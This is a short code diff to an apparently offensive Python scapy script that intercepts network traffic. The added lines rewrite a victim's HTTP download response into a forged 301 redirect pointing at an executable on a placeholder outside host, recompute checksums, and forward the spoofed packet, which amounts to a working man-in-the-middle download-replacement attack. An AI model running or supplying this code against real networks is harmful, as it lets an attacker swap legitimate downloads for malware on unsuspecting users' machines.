@@ -39,6 +39,11 @@ def file_override(packet):
         elif hacked_packet[scapy.TCP].sport == 80:
             if hacked_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(hacked_packet[scapy.TCP].seq)
+                hacked_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently \nLocation: https://www.WEBSITE.com/files.exe"
+                del hacked_packet[scapy.IP].len
+                del hacked_packet[scapy.IP].chksum
+                del hacked_packet[scapy.TCP].chksum
+                packet.set_payload(bytes(hacked_packet))
             #print(hacked_packet.show())
     packet.accept()
 
